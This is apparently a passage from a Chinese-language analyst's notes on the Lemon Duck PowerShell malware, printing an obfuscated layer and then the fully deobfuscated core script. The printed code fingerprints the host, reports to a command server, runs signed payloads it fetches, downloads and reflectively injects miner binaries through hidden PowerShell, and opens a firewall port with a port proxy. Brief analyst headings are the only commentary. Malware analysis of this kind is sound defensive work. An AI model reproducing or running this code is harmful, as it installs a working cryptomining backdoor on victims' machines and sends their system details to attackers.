ui8mbinwMl;FVti'+'+VtiMl+wMlif(testVti+Vti-path ui8mp)Vti+Vti{ui8coVti+Vtin=[System'+'.IO.Fil'+'e]::ReadAllBytes('+'ui8mp);[System.Sec'+'urity'+'.Cryptography.MD5]::Cr'+'eate().ComputeHash(ui8con)snQforeach{ui8s+=ui8_.ToS'+'tring(wMVti+Vti'+'lwMlX2wMlwMl)};if(ui8s-ne
wMl+FMlwMlui8mmd5wMlFMl+wMl){ui8con=wMlwMlwMlwMl}}if(!ui8con){ui8con=(New-Object Net.WebClient).downloaddata(wMlwMlwMl + FMlui8down_url'+'/uVti+Vtii8{mbin}?Vti+VtiFMl +'+' ui8'+'params + wMl'+'wMlwMl);[Sys'+'tem.IO.File]::WriteAllByt'+'eVti+Vtis(ui8mp,ui8con)};for('+
'ui8i=0;ui8i -'+'lt ui8con.count-1;ui8i+=1Vti'+'+Vti)'+'{if(ui8con[ui'+'8i] -eqVti+Vti 0x0a){'+'break}};iex(-join[char[]]ui8con[0..uiVti+Vti8i]);In'+'voke-ReflVti+VtiecVti+V'+'titivePEInjection -ForceASLR -PE'+'Bytes ui8con[(ui8i+1)'+'..(ui8'+'c'+'on.count)]FMlwMl'+'
		Start-PVti+Vtirocess -FilePath cmd.exe -Argu'+'m'+'Vti+VtientList FMlui8argFMl
	}Vti+Vti
	if(ui8isA -and '+'ui8loca'+'lMVti+Vtina){
		u'+'i8mmd5 = FMle2ed6568626e696'+'de58f13b'+'2aa26243dFMl
		ui8arg = FMl/c p'+'owershV'+'ti+Vtiell -nop -w hidden -ep bypass -c'+' FMl'+'+wMlFMV
ti+VtilwMl'+'+ui8code3+wMl;ui8mp=uiVti+Vt'+'i8env:tmp+wMl+FMlwMlW'+'z'+'bm6a.binwMl;FMl+wMlif(tes'+'t-path ui8mp){uiVti+Vti8con=[System.IO.File]::'+'Re'+'adAllBytes(ui8mp);[System.Securi'+'ty.Cry'+'Vti+Vti'+'ptography.MD5]::Create().ComputeHash(ui8con)snQfor'+'each{V
t'+'i+Vtiui8s+=ui8_.ToString(w'+'MlwMlX2wMlwMl)};if(ui8s-'+'newMl+FMlwMlui8mmd'+'5wM'+'lFMl+wMl){ui8con=wMlwMlwMlwM'+'l}}if(!ui8con){ui8con=(Ne'+'w-Obje'+'ct Net'+'.WebClient).downloaddata(wMlwMlwMl + FMlui8down_url/m6a.bin?FMl + ui8params + wMlwMlwMl);[System.IO.Fil
e]::Wr'+'iteAllBytes(ui'+'8mp,ui8con)}Vti+Vti;for(ui8i=0;ui8i -lt ui8con.count-1;ui8i+=1){if(ui8c'+'on[ui8i] -eq 0x0a){break}};iex(-join['+'char[]]ui8con[0..ui8i]);In'+'vo'+'ke-ReflectivePEInjection -ForceASLR -PEByteVti+Vtis ui8con[(ui8i+1)..(ui8con.count'+')]FMlwMl
		Start-Process -FilePath c'+'md.exe -ArgumentList FMlui8argFMl
	}
}catch{}

Vti+VtiSIEX ui8core_url

cmd.exe /c netsh.exe firewal'+'l add portopeVti+VtiningVt'+'i+Vti tcp 65Vti+Vti529 SDNS
netsh.exe interfaVti+Vtice'+' portpro'+'xy add v4tov4 listenpor'+'t=65529 '+'connectaddress=1.1.1.1 connectport=53
Vt'+'i)-cREPLace
'+' VtiFMlVti,[ChAR]34  -rEpLAcE ([ChAR]117+[Ch'+'AR]105+[ChAR]56),[ChAR'+']36 -rEpLAcE  ([ChAR]115+[ChAR]110+[Ch'+'AR]81),[ChAR'+']12'+'4 -cREPLace VtiWzbVti'+',[ChAR]92  -rEpLAcE  VtiwMlVti,'+'[ChAR]39)Bbe. ( BPVveRbOSeprEferEncE.TostRING()[1,3]+VtiXVti-JoiNVtiVti)

')-cRePlace([Char]66+[Char]98+[Char]101),[Char]124 -cRePlace([Char]66+[Char]80+[Char]86),[Char]36-rEPlACE([Char]86+[Char]116+[Char]105),[Char]39) )
```

* 第七次解密
```
(('ui8permit = ([Security.Principal.WindowsPrincipal]['+'Security.P'+'rincip'+'al.WindowsIdentity]::GetCurrent()).IsInRole([Security'+'.Principal.WindowsBuiltInRole] FMlAdministratorFMl)
ui8code1=wMltry{ui8localIf=ui8flase'+';New-Object System'+'.Threading.Mutex(ui'+'8true,wMl+FMlwMl'+'GlobalWzbLocalIfwMlFMl+wMl,'+'[ref]ui8l'+'ocalIf)}catch{}wMl
ui8code2=wMltry{ui8localMn=ui8flase;New-Object System.Threading.Mutex'+'(ui8true,wMl+FMlwMlGlo'+'b'+'alWzbLocalMnwMlFMl+wMl,['+'ref]ui8localMn)}catch{}wMl
ui8code3=wMltry{ui8localMna=ui8flase;New-Object System.Threading.Mutex(ui8true,wMl+FMlwMlGlobalWzbLocalMnawMlFMl+wMl,[ref]ui8l'+'ocalMna)}catch{}'+'wMl
IEX ui8c'+'ode2
IEX ui8code1'+'
ui8comp_name = ui8env:C'+'OMP'+'UTERNAME
ui8guid = (get-wmiobject Win32_ComputerSystemPr'+'oduct'+').UUID
ui8mac = (Get-WmiObject Win32_N'+'etworkAdapterConfiguration snQ where {ui8_.ipenabled -EQ ui8true}).Macaddress snQ select-object -first 1
ui8os = (Get-WmiObject -class Win32_OperatingSystem).Version
ui8bit = ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -split FMl-FMl)[0]
ui8user = ui8env:USERNAME
ui8domain = (Get-WmiObject win32_computersystem).Domain
ui8uptim'+'e'+' = [timespan]::FromMilliseco'+'nds([en'+'vironment]::TickCount)snQforeach{ui8_.totalseconds}
ui8card = ([stri'+'ng](Wmic Path Win32_VideoController Get Description)).trim(FMlDescriptionFMl).trim()
ui8if_ = Test-Path ui8env:tmpWzbif.bin
'+'ui8mf_ = (Test-Path ui8env:tmpWzbm3.bin) -or (Test'+'-Path ui8env:tmpWzbm6.bin)
try{
ui8drive = ([system.IO.DriveInfo]::GetDrives() snQ whe'+'re {ui8_.IsReady -and (ui8_.AvailableFreeSpace -gt 1024) -and ((ui8_.DriveType -eq FMlRe'+'mov
ableFMl) -or (ui8_.DriveType -eq FMlNetwork'+'FMl)) -and ((ui8_.Dri'+'veFormat -eq FMlNTFSFMl) -or (ui8_.DriveFormat -eq FMlFAT32FMl))} snQ foreach{(ui8_.Name)[0]+FMl_FM'+'l'+'+(u'+'i8_.'+'DriveType.tostring())[0]})-joinFMlsnQFMl}catch{}
ui8timestamp = Get-Date -UFormat FMl%sFMl
if((new-obj
ect system.net.webclient).downloadstring(wMlhttp://127.0.0.1:43669/1/summarywMl) -match wMlFMltotalFMl: Wzb[Wzbn(.+)W'+'zbn(.+)Wzbn(.+)Wzbn'+'wMl){ui8hr=ui8matches[1].trim()+ui8matches[2].trim()+ui8mat'+'ches[3].trim()}
ui8isA = (ui8card -match FMlRadeonFMl) -a'+'nd ([IntPtr]::Size -eq 8)

ui8params = FMlID=FMl'+'+ui8comp_name+FMl&G'+'UID=FMl+ui8guid+FMl&MAC=FMl+ui8mac+FMl&OS=FMl+ui'+'8os+FMl&BIT=FMl+ui8bit+FMl&USER=FMl+ui8user+FMl&DOMAIN=FMl+ui8domain+FMl&D=FMl+ui8dr
ive+FMl&CD=FMl+ui8card+FMl&P=FMl+[Int]ui8per'+'mit+FMl&FI=FMl+[Int]!ui8loc'+'alIf+FMl&FM=FMl+[Int]!ui8lo'+'calMn+FMl&IF=FMl+[Int]ui8if_+F'+'Ml&MF=FMl+[Int]ui8mf_+FMl&HR=F'+'Ml+ui8hr+FMl&UP=FMl+ui8uptime+FMl&_T=FMl+ui8timestamp

if(ui8isA){
	IEX ui8code3
	if((new-object sy'+'stem.net.webclient).downloadstring(wMlhttp://127.0.0.1:43668/1/summarywMl) -match wMlFMltotalFMl:'+' Wzb[Wzbn(.+)Wzbn(.+)Wzbn(.+)WzbnwMl){
		ui8hra=ui8matches[1].trim()+ui8matches[2].trim()+ui8matches[3].tr'+'im()
		ui8params+=FMl&HRA=FMl+ui8hra
	}

}
'+'
ui8core_url = FMlhttp://t.zer2.com/report.j'+'spFMl
ui8down_url = FMlhttp://dow'+'n.ackng.comFMl

function SIEX {  
	Param(
	[string]ui8url'+'
	)
	try{
		ui8webclient = New-Ob'+'ject System.Net.Web'+'Client
		ui8finalurl = FMlui8urlFMl+FMl?FMl+FMlui8paramsFMl
		try{
			ui8webclient.Headers.add(FMlUser-AgentFMl,FMlLemon-Duck-FMl+ui8L'+'emon_Duck.replace'+'(wMlWzbwMl,wMl-wMl))
		'+'} catch{}
		ui8res_bytes = ui8webclient.Down'+'loadData(ui8finalurl)
		if(ui8res_byte'+'s.count -gt 173){
			ui8sign_bytes = ui8res_bytes[0'+'..171];
			ui8raw_bytes = ui8res_bytes[173..ui8res_bytes.count];
'+'			ui8rsaPa'+'rams = New-Object System.Security.Cryptography'+'.RSAPar'+'ame'+'ters
			ui8rsaParams.Modulus = 0xd
a'+',0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,0x41,0x5'+'e,0x99,0x9d,0'+'x82'+',0x'+'ff,0x2f,0xff,0x73,0x53,0x9a,0'+'x73,0x6e,0x6c'+',0x7b,0x55,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc0,0xcd,0xcd,0x37,0x6b,0xf3,0x4f,0x3
b,'+'0x62,0x70,0x86,0x07,0x96,'+'0x6e,0xca,0xde,0xbd,0xa6,0x4f,0xf6,0x11,0xd1,0x'+'60,0xdc,0x88,0xbf,0x35,0xf2,0x92,0xee'+',0x6c,0xb8,0x2e,0x9b,0x7d,0x2b,0xd1,0x19,0x30,0x73,0xc6,0x52,0x01,0xcd,0xe7,0xc7,0x34,0x78,0x8a,'+V
ti0xa7,0x9f'+',0xe2,0x12,0xcd,0x79,0x40,0xa7,'+'0x91,0x6a,0xae,0x95,0x8e,0x42,0xd0,0xcf,0x39,0x6e,0x30,0xcb,0x0a,0x98,0xdb,0x97,0x3f,0xf6,0x2e,0x95,0x10,0x72,0x'+'fd,0x63,0xd5,0xf7,0x88,0x63,0xa4,0x7b,0xae,0x97,0xea,0x38,0xb7,0x47,0x6b,0x5d
			ui8rsaParams.Exponent = 0x01,0x00,0x01
			ui8rsa = New-Obje'+'ct -TypeName System.Security.Cryptography.RSACryptoService'+'Provider;
			ui8rsa.ImportP'+'arameters(ui8rsaParams)
			ui8base64 = -join'+'([char[]]ui8sign'+'_bytes)
			ui8byteArray = [conv'+'ert]::FromBase64String(ui8base64)
			u'+'i8sha1 = New-Object System.'+'Security'+'.Cryptography.SHA1CryptoServiceProvider
			if(ui8rsa.verifyData(ui8raw_'+'bytes,ui8sha1,ui8byteArray)) {
				IEX (-join[char[]]ui8ra'+'w_bytes)
			}
		}
	} catch{}
}

try{'+'
	if(ui8localIf'+'){
		ui8ifmd5=FMlabcc20b2de0b18c895b94d2c23c0bc63FMl
		ui8ar'+'g = FMl/c powershell -nop -w hidden -ep b'+'y'+'pass -c FMl + wMlFMlwMl+wMlui8ifp=ui8env:tmp+wMlwMlWzbif.binwMlwMl;if(te
st-path ui8ifp){ui8con=[System.I'+'O.File]::ReadAllBytes(ui8ifp);[System.Security.Cryptography.MD5]::Create().Comput'+'eHash(ui8con)snQforeach{ui8s+=ui8_.ToString(wMlwMlX2wMlwMl)};if(ui8s-newMl'+'+FMlwMlui8ifmd5wMlFMl+wMl){ui8'+'c
on=wMlwM'+'lwMlwMl}}if(!ui8con){ui8con=(New'+'-Obje'+'ct Net.Web'+'Client).downl'+'oaddata(wMlwMlwMl + FMlui8down_url/if.bin?FMl + ui8params + wMlwMlwMl);[S'+'ystem.IO.File]::WriteAllBytes(ui8ifp,ui8con)}IEX(-join[char[]]ui8con)FMlwMl
		Start-Process -FilePath cmd.exe -Argume'+'ntList FMlui8argFMl
	}'+'
}catch{}

try{
	if(ui8localMn){
		if([IntPtr]::Size -eq 8){
			ui8mbin = FMlm6.binFMl
			ui8mmd5 = FMla48ea878f703c32ddac33abc6fad70d3FMl'+'
		}else{
			ui8mbin = FMlm3.binFMl
			ui8mmd5 = FMl9e72de890eeb784a875ef57b85b3ee1dFMl
		'+'}
		ui8arg = FMl/c powershell -nop -w hidden -ep bypass -c'+' FMl+wM'+'lFMlwMl+ui8cod'+'e2+wMl;ui8mp=ui8env:tmp+wMl+FM'+'lwMlWzb
ui8mbinwMl;F'+'Ml+wMlif(test'+'-path ui8mp)'+'{ui8co'+'n=[System.IO.File]::ReadAllBytes(ui8mp);[System.Security.Cryptography.MD5]::Create().ComputeHash(ui8con)snQforeach{ui8s+=ui8_.ToString(wM'+'lwMlX2wMlwMl)};if(ui8s-ne
wMl+FMlwMlui8mmd5wMlFMl+wMl){ui8con=wMlwMlwMlwMl}}if(!ui8con){ui8con=(New-Object Net.WebClient).downloaddata(wMlwMlwMl + FMlui8down_url/u'+'i8{mbin}?'+'FMl + ui8params + wMlwMlwMl);[System.IO.File]::WriteAllByte'+'s(ui8mp,ui8con)};for(ui8i=0;ui8i -lt ui8con.count-1;u
i8i+=1'+'){if(ui8con[ui8i] -eq'+' 0x0a){break}};iex(-join[char[]]ui8con[0..ui'+'8i]);Invoke-Refl'+'ec'+'tivePEInjection -ForceASLR -PEBytes ui8con[(ui8i+1)..(ui8con.count)]FMlwMl
		Start-P'+'rocess -FilePath cmd.exe -Argum'+'entList FMlui8argFMl
	}'+'
	if(ui8isA -and ui8localM'+'na){
		ui8mmd5 = FMle2ed6568626e696de58f13b2aa26243dFMl
		ui8arg = FMl/c powersh'+'ell -nop -w hidden -ep bypass -c FMl+wMlFMV
ti+'lwMl+ui8code3+wMl;ui8mp=ui'+'8env:tmp+wMl+FMlwMlWzbm6a.binwMl;FMl+wMlif(test-path ui8mp){ui'+'8con=[System.IO.File]::ReadAllBytes(ui8mp);[System.Security.Cry'+'ptography.MD5]::Create().ComputeHash(ui8con)snQforeach{V
ti+'ui8s+=ui8_.ToString(wMlwMlX2wMlwMl)};if(ui8s-newMl+FMlwMlui8mmd5wMlFMl+wMl){ui8con=wMlwMlwMlwMl}}if(!ui8con){ui8con=(New-Object Net.WebClient).downloaddata(wMlwMlwMl + FMlui8down_url/m6a.bin?FMl + ui8params + wMlwMlwMl);[System.IO.Fil
e]::WriteAllBytes(ui8mp,ui8con)}'+';for(ui8i=0;ui8i -lt ui8con.count-1;ui8i+=1){if(ui8con[ui8i] -eq 0x0a){break}};iex(-join[char[]]ui8con[0..ui8i]);Invoke-ReflectivePEInjection -ForceASLR -PEByte'+'s ui8con[(ui8i+1)..(ui8con.count)]FMlwMl
		Start-Process -FilePath cmd.exe -ArgumentList FMlui8argFMl
	}
}catch{}

'+'SIEX ui8core_url

cmd.exe /c netsh.exe firewall add portope'+'ning'+' tcp 65'+'529 SDNS
netsh.exe interfa'+'ce portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53
')-cREPLace
 'FMl',[ChAR]34  -rEpLAcE ([ChAR]117+[ChAR]105+[ChAR]56),[ChAR]36 -rEpLAcE  ([ChAR]115+[ChAR]110+[ChAR]81),[ChAR]124 -cREPLace 'Wzb',[ChAR]92  -rEpLAcE  'wMl',[ChAR]39)|. ( $veRbOSeprEferEncE.TostRING()[1,3]+'X'-JoiN'')
```

* 真正的核心代碼
```
$permit = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
$code1='try{$localIf=$flase;New-Object System.Threading.Mutex($true,'+"'Global\LocalIf'"+',[ref]$localIf)}catch{}'
$code2='try{$localMn=$flase;New-Object System.Threading.Mutex($true,'+"'Global\LocalMn'"+',[ref]$localMn)}catch{}'
$code3='try{$localMna=$flase;New-Object System.Threading.Mutex($true,'+"'Global\LocalMna'"+',[ref]$localMna)}catch{}'
IEX $code2
IEX $code1
$comp_name = $env:COMPUTERNAME
$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID
$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1
$os = (Get-WmiObject -class Win32_OperatingSystem).Version
$bit = ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -split "-")[0]
$user = $env:USERNAME
$domain = (Get-WmiObject win32_computersystem).Domain
$uptime = [timespan]::FromMilliseconds([environment]::TickCount)|foreach{$_.totalseconds}
$card = ([string](Wmic Path Win32_VideoController Get Description)).trim("Description").trim()
$if_ = Test-Path $env:tmp\if.bin
$mf_ = (Test-Path $env:tmp\m3.bin) -or (Test-Path $env:tmp\m6.bin)
try{
$drive = ([system.IO.DriveInfo]::GetDrives() | where {$_.IsReady -and ($_.AvailableFreeSpace -gt 1024) -and (($_.DriveType -eq "Remov
able") -or ($_.DriveType -eq "Network")) -and (($_.DriveFormat -eq "NTFS") -or ($_.DriveFormat -eq "FAT32"))} | foreach{($_.Name)[0]+"_"+($_.DriveType.tostring())[0]})-join"|"}catch{}
$timestamp = Get-Date -UFormat "%s"
if((new-obj
ect system.net.webclient).downloadstring('http://127.0.0.1:43669/1/summary') -match '"total": \[\n(.+)\n(.+)\n(.+)\n'){$hr=$matches[1].trim()+$matches[2].trim()+$matches[3].trim()}
$isA = ($card -match "Radeon") -and ([IntPtr]::Size -eq 8)

$params = "ID="+$comp_name+"&GUID="+$guid+"&MAC="+$mac+"&OS="+$os+"&BIT="+$bit+"&USER="+$user+"&DOMAIN="+$domain+"&D="+$dr
ive+"&CD="+$card+"&P="+[Int]$permit+"&FI="+[Int]!$localIf+"&FM="+[Int]!$localMn+"&IF="+[Int]$if_+"&MF="+[Int]$mf_+"&HR="+$hr+"&UP="+$uptime+"&_T="+$timestamp

if($isA){
	IEX $code3
	if((new-object system.net.webclient).downloadstring('http://127.0.0.1:43668/1/summary') -match '"total": \[\n(.+)\n(.+)\n(.+)\n'){
		$hra=$matches[1].trim()+$matches[2].trim()+$matches[3].trim()
		$params+="&HRA="+$hra
	}

}

$core_url = "http://t.zer2.com/report.jsp"
$down_url = "http://down.ackng.com"

function SIEX {  
	Param(
	[string]$url
	)
	try{
		$webclient = New-Object System.Net.WebClient
		$finalurl = "$url"+"?"+"$params"
		try{
			$webclient.Headers.add("User-Agent","Lemon-Duck-"+$Lemon_Duck.replace('\','-'))
		} catch{}
		$res_bytes = $webclient.DownloadData($finalurl)
		if($res_bytes.count -gt 173){
			$sign_bytes = $res_bytes[0..171];
			$raw_bytes = $res_bytes[173..$res_bytes.count];
			$rsaParams = New-Object System.Security.Cryptography.RSAParameters
			$rsaParams.Modulus = 0xd
a,0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,0x41,0x5e,0x99,0x9d,0x82,0xff,0x2f,0xff,0x73,0x53,0x9a,0x73,0x6e,0x6c,0x7b,0x55,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc0,0xcd,0xcd,0x37,0x6b,0xf3,0x4f,0x3
b,0x62,0x70,0x86,0x07,0x96,0x6e,0xca,0xde,0xbd,0xa6,0x4f,0xf6,0x11,0xd1,0x60,0xdc,0x88,0xbf,0x35,0xf2,0x92,0xee,0x6c,0xb8,0x2e,0x9b,0x7d,0x2b,0xd1,0x19,0x30,0x73,0xc6,0x52,0x01,0xcd,0xe7,0xc7,0x34,0x78,0x8a,V
ti0xa7,0x9f,0xe2,0x12,0xcd,0x79,0x40,0xa7,0x91,0x6a,0xae,0x95,0x8e,0x42,0xd0,0xcf,0x39,0x6e,0x30,0xcb,0x0a,0x98,0xdb,0x97,0x3f,0xf6,0x2e,0x95,0x10,0x72,0xfd,0x63,0xd5,0xf7,0x88,0x63,0xa4,0x7b,0xae,0x97,0xea,0x38,0xb7,0x47,0x6b,0x5d
			$rsaParams.Exponent = 0x01,0x00,0x01
			$rsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider;
			$rsa.ImportParameters($rsaParams)
			$base64 = -join([char[]]$sign_bytes)
			$byteArray = [convert]::FromBase64String($base64)
			$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
			if($rsa.verifyData($raw_bytes,$sha1,$byteArray)) {
				IEX (-join[char[]]$raw_bytes)
			}
		}
	} catch{}
}

try{
	if($localIf){
		$ifmd5="abcc20b2de0b18c895b94d2c23c0bc63"
		$arg = "/c powershell -nop -w hidden -ep bypass -c " + '"'+'$ifp=$env:tmp+''\if.bin'';if(te
st-path $ifp){$con=[System.IO.File]::ReadAllBytes($ifp);[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{$s+=$_.ToString(''X2'')};if($s-ne'+"'$ifmd5'"+'){$c
on=''''}}if(!$con){$con=(New-Object Net.WebClient).downloaddata(''' + "$down_url/if.bin?" + $params + ''');[System.IO.File]::WriteAllBytes($ifp,$con)}IEX(-join[char[]]$con)"'
		Start-Process -FilePath cmd.exe -ArgumentList "$arg"
	}
}catch{}

try{
	if($localMn){
		if([IntPtr]::Size -eq 8){
			$mbin = "m6.bin"
			$mmd5 = "a48ea878f703c32ddac33abc6fad70d3"
		}else{
			$mbin = "m3.bin"
			$mmd5 = "9e72de890eeb784a875ef57b85b3ee1d"
		}
		$arg = "/c powershell -nop -w hidden -ep bypass -c "+'"'+$code2+';$mp=$env:tmp+'+"'\
$mbin';"+'if(test-path $mp){$con=[System.IO.File]::ReadAllBytes($mp);[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{$s+=$_.ToString(''X2'')};if($s-ne
'+"'$mmd5'"+'){$con=''''}}if(!$con){$con=(New-Object Net.WebClient).downloaddata(''' + "$down_url/${mbin}?" + $params + ''');[System.IO.File]::WriteAllBytes($mp,$con)};for($i=0;$i -lt $con.count-1;u
i8i+=1){if($con[$i] -eq 0x0a){break}};iex(-join[char[]]$con[0..$i]);Invoke-ReflectivePEInjection -ForceASLR -PEBytes $con[($i+1)..($con.count)]"'
		Start-Process -FilePath cmd.exe -ArgumentList "$arg"
	}
	if($isA -and $localMna){
		$mmd5 = "e2ed6568626e696de58f13b2aa26243d"
		$arg = "/c powershell -nop -w hidden -ep bypass -c "+'FMV
til'+$code3+';$mp=$env:tmp+'+"'\m6a.bin';"+'if(test-path $mp){$con=[System.IO.File]::ReadAllBytes($mp);[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{V
ti$s+=$_.ToString(''X2'')};if($s-ne'+"'$mmd5'"+'){$con=''''}}if(!$con){$con=(New-Object Net.WebClient).downloaddata(''' + "$down_url/m6a.bin?" + $params + ''');[System.IO.Fil
e]::WriteAllBytes($mp,$con)};for($i=0;$i -lt $con.count-1;$i+=1){if($con[$i] -eq 0x0a){break}};iex(-join[char[]]$con[0..$i]);Invoke-ReflectivePEInjection -ForceASLR -PEBytes $con[($i+1)..($con.count)]"'
		Start-Process -FilePath cmd.exe -ArgumentList "$arg"
	}
}catch{}

SIEX $core_url

cmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNS
netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53
```

* 搜集信息
```
ID=WIN-QGKTOC6TTN2&GUID=01004D56-9069-DA26-2EF8-A99E972C05B1&MAC=00:0C:29:2C:05:B1&OS=6.1.7600&BIT=32&USER=kingsoft&DOMAIN=WORKGROUP&D=&CD=VMware SVGA 3D&P=0&FI=0&FM=0&IF=0&MF=0&HR=&UP=11238.327&_T=1568386068.01252
```


* 反虚拟机?
`
([string](Wmic Path Win32_VideoController Get Description)).trim("Description").trim()
`

* 下载3下载3个bin文件
* 分析其中一个最小的if.bin
* 解密if.bin -> if.bin.txt

太多待续
